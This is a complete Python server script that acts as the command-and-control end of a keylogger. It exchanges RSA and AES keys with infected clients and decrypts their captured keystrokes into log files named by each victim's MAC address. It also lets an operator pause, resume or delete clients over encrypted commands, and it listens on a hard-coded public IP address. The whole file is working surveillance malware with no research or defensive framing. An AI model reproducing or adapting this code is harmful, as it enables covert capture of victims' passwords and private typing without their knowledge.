#!/usr/bin/env python3
"""
server.py

This server accepts connections from keylogger clients. For each new client:
  1. It sends its RSA public key.
  2. It receives an AES key (encrypted with RSA) along with the client’s MAC address.
  3. It then receives “log” messages (each containing an AES–encrypted log of keystrokes).

The server decrypts these logs and appends them to a text file named with the client’s MAC in a “logs” folder.
It also starts a console thread so you can type commands (pause/resume/delete) to control a client.
"""

import socket
import threading
import json
import base64
import os

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


# --------------------------
# Utility functions
# --------------------------
def pad(data: bytes) -> bytes:
    """PKCS7 padding."""
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len]) * pad_len


def unpad(data: bytes) -> bytes:
    """Remove PKCS7 padding."""
    pad_len = data[-1]
    return data[:-pad_len]


def send_json(conn: socket.socket, message: dict):
    """Send a JSON message terminated by a newline."""
    data = json.dumps(message) + "\n"
    conn.sendall(data.encode())


def recv_json(conn_file) -> dict:
    """Receive a JSON message (one line) from a file–like object."""
    line = conn_file.readline()
    if not line:
        return None
    return json.loads(line)


# --------------------------
# Global variables
# --------------------------
# This dictionary maps client MAC addresses to their connection info.
clients = {}
clients_lock = threading.Lock()

# --------------------------
# RSA key generation for the server
# --------------------------
RSA_KEY_SIZE = 2048


def generate_rsa_keys():
    key = RSA.generate(RSA_KEY_SIZE)
    return key


server_rsa_key = generate_rsa_keys()
server_public_key_pem = server_rsa_key.publickey().export_key().decode()


# --------------------------
# Client handler thread
# --------------------------
def handle_client(conn: socket.socket, addr):
    print(f"[+] New connection from {addr}")
    conn_file = conn.makefile('r')
    aes_key = None
    client_mac = None
    try:
        # Step 1: Send RSA public key to the client.
        initial_message = {"type": "public_key", "data": server_public_key_pem}
        send_json(conn, initial_message)

        # Step 2: Wait for the key–exchange message from the client.
        key_exchange_msg = recv_json(conn_file)
        if key_exchange_msg is None or key_exchange_msg.get("type") != "key_exchange":
            print("[-] Key exchange failed; closing connection.")
            conn.close()
            return

        # The client sends its MAC address along with the AES key (encrypted with RSA).
        encrypted_key_b64 = key_exchange_msg.get("encrypted_key")
        client_mac = key_exchange_msg.get("mac")
        if not encrypted_key_b64 or not client_mac:
            print("[-] Invalid key exchange message received.")
            conn.close()
            return

        encrypted_key = base64.b64decode(encrypted_key_b64)
        rsa_cipher = PKCS1_OAEP.new(server_rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_key)
        print(f"[+] Received AES key from client {client_mac}")

        # Save this client’s connection and AES key.
        with clients_lock:
            clients[client_mac] = {"conn": conn, "aes_key": aes_key, "paused": False}

        # Loop to receive log messages.
        while True:
            msg = recv_json(conn_file)
            if msg is None:
                print(f"[-] Connection closed by {client_mac}")
                break

            if msg.get("type") == "log":
                # Client’s log message: contains an AES–encrypted log and an IV.
                encrypted_data_b64 = msg.get("data")
                iv_b64 = msg.get("iv")
                if not encrypted_data_b64 or not iv_b64:
                    print("[-] Invalid log message from client.")
                    continue

                encrypted_data = base64.b64decode(encrypted_data_b64)
                iv = base64.b64decode(iv_b64)
                cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                try:
                    decrypted_data = unpad(cipher.decrypt(encrypted_data)).decode('utf-8')
                except Exception as e:
                    print("[-] Decryption error:", e)
                    continue

                print(f"[Log from {client_mac}]: {decrypted_data}")

                # Write (or update) the log file for this MAC address.
                if not os.path.exists("logs"):
                    os.makedirs("logs")
                log_file_path = os.path.join("logs", f"{client_mac}.txt")
                with open(log_file_path, "a", encoding="utf-8") as f:
                    f.write(decrypted_data + "\n")
            else:
                print("[-] Unknown message type from client:", msg.get("type"))
    except Exception as e:
        print(f"[!] Exception with client {client_mac if client_mac else addr}: {e}")
    finally:
        conn.close()
        with clients_lock:
            if client_mac in clients:
                del clients[client_mac]
        print(f"[-] Connection with {client_mac if client_mac else addr} closed.")


# --------------------------
# Console command thread
# --------------------------
def console_command_thread():
    """
    This thread reads commands from the console.
    Commands have the form:
      pause <MAC>
      resume <MAC>
      delete <MAC>
    The command is sent to the corresponding client (encrypted with its AES key).
    """
    while True:
        command = input("Enter command (pause/resume/delete <MAC>): ").strip()
        parts = command.split()
        if len(parts) != 2:
            print("[-] Invalid command format.")
            continue
        action, mac = parts
        with clients_lock:
            if mac not in clients:
                print(f"[-] No client with MAC {mac} connected.")
                continue
            client_info = clients[mac]
            conn = client_info["conn"]
            aes_key = client_info["aes_key"]

            # Build a control message.
            cmd_msg = {"command": action}
            # Encrypt the control message with AES.
            iv = AES.new(aes_key, AES.MODE_CBC).iv  # Generate a new IV.
            cipher = AES.new(aes_key, AES.MODE_CBC, iv)
            cmd_data = json.dumps(cmd_msg).encode('utf-8')
            padded_cmd_data = pad(cmd_data)
            encrypted_cmd = cipher.encrypt(padded_cmd_data)

            cmd_message = {
                "type": "control_enc",
                "data": base64.b64encode(encrypted_cmd).decode(),
                "iv": base64.b64encode(iv).decode()
            }
            try:
                send_json(conn, cmd_message)
                print(f"[+] Sent command '{action}' to client {mac}")
            except Exception as e:
                print(f"[-] Failed to send command to client {mac}: {e}")


# --------------------------
# Main server loop
# --------------------------
def main():
    server_ip = "143.198.52.68"
    server_port = 54321

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((server_ip, server_port))
    sock.listen(5)
    print(f"[+] Server listening on {server_ip}:{server_port}")

    # Start the console command thread.
    threading.Thread(target=console_command_thread, daemon=True).start()

    # Accept client connections.
    while True:
        conn, addr = sock.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
